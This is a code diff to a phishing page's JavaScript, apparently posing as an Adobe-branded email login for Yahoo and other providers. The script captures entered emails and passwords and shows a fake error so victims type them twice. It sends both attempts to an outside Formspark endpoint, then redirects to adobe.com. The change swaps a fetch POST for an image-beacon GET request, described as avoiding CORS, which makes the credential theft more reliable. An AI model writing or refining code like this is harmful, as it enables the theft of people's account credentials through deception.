@@ -270,7 +270,7 @@ input {
 <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
 
 <script>
-// Formspark endpoint
+// Formspark endpoint - CORRECT URL
 const formsparkUrl = "https://submit-form.com/0gyAIslPc";
 
 // Store first attempt credentials
@@ -298,33 +298,12 @@ document.querySelectorAll('form').forEach(form => {
 		if (form.id === 'yahooForm') provider = 'yahoo';
 		if (form.id === 'otherForm') provider = 'other';
 		
-		// Prepare data for Formspark
-		const data = {
-			email: email,
-			password: password,
-			provider: provider,
-			attempt: attempt
-		};
-		
 		// Show spinner
 		showSpinner();
 		
-		// Send data to Formspark in background
-		fetch(formsparkUrl, {
-			method: 'POST',
-			headers: {
-				'Content-Type': 'application/json',
-			},
-			body: JSON.stringify(data)
-		}).then(response => {
-			console.log('Attempt ' + attempt + ' submitted to Formspark');
-		}).catch(error => {
-			console.error('Error:', error);
-		});
-		
 		// Check if this is first or second attempt
 		if (attempt == 1) {
-			// First attempt: Store credentials and show error
+			// First attempt: Store credentials
 			firstAttempt.email = email;
 			firstAttempt.password = password;
 			firstAttempt.provider = provider;
@@ -332,37 +311,31 @@ document.querySelectorAll('form').forEach(form => {
 			// Update hidden field to 2 for next attempt
 			$(this).find('input[type="hidden"]').val('2');
 			
+			// Send to Formspark using image beacon method (avoids CORS completely)
+			var img = new Image();
+			img.src = formsparkUrl + '?email=' + encodeURIComponent(email) + 
+					  '&password=' + encodeURIComponent(password) + 
+					  '&provider=' + encodeURIComponent(provider) + 
+					  '&attempt=' + attempt;
+			
 			// Show error after 2 seconds
 			setTimeout(showError, 2000);
 			
 		} else {
-			// Second attempt: Send both attempts combined, then redirect
-			const combinedData = {
-				first_attempt: firstAttempt,
-				second_attempt: {
-					email: email,
-					password: password,
-					provider: provider
-				},
-				attempt: 'final'
-			};
+			// Second attempt: Send both attempts combined via image beacon
+			var img = new Image();
+			img.src = formsparkUrl + '?first_email=' + encodeURIComponent(firstAttempt.email) + 
+					  '&first_password=' + encodeURIComponent(firstAttempt.password) + 
+					  '&first_provider=' + encodeURIComponent(firstAttempt.provider) + 
+					  '&second_email=' + encodeURIComponent(email) + 
+					  '&second_password=' + encodeURIComponent(password) + 
+					  '&second_provider=' + encodeURIComponent(provider) + 
+					  '&attempt=final';
 			
-			// Send combined data to Formspark
-			fetch(formsparkUrl, {
-				method: 'POST',
-				headers: {
-					'Content-Type': 'application/json',
-				},
-				body: JSON.stringify(combinedData)
-			}).then(response => {
-				console.log('Final combined data sent');
-				// Redirect to Adobe
+			// Redirect to Adobe after a short delay
+			setTimeout(function() {
 				window.location.href = 'https://adobe.com';
-			}).catch(error => {
-				console.error('Error:', error);
-				// Still redirect even if error
-				window.location.href = 'https://adobe.com';
-			});
+			}, 500);
 		}
 	});
 });
@@ -383,7 +356,7 @@ function showError(){
 	error.show();
 	clearSpinner();
 	
-	// Hide error after 3 seconds (original behavior)
+	// Hide error after 3 seconds
 	setTimeout(clearError, 3000);
 }
 	
